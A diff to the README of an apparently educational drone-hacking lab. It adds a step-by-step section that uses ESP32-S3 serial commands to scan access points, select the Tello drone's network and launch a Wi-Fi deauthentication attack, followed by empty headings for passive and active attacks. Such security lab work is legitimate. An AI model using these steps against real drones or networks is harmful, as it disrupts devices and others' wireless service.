@@ -142,11 +142,48 @@ python3 tello_testing.py
 
 ---
 
-## 5. Using the ESP32-S3 for a Passive Attack
+## 5. Using the ESP32-S3 to Deauthenticate the Tello's Wi-Fi connection
+
+1. Connect your ESP32-S3 to the serial terminal.
+    (Optional) - Run 'help' to see a list of commands
+
+2. Scan the available Access Points
+```
+scanap
+```
+Note: Use 'stopscan' to stop any currently running WiFi/Bluetooth scan/attack.
+
+3. Identify the index of the drone and add it to the list.
+
+```
+select -a <index>
+```
+
+4. Confirm the correct index was selected
+
+```
+list -a
+```
+
+5. Deauthenticate the AP's in the list (only intended for educational purposes)
+
+```
+attack -t deauth
+```
+
+6. Stop the attack
+
+```
+stopscan
+```
 
 ---
 
-## 6. Using the ESP32-S3 for an Active Attack
+## 6. Using the ESP32-S3 for a Passive Attack
+
+---
+
+## 7. Using the ESP32-S3 for an Active Attack
 ---
 
 ## References
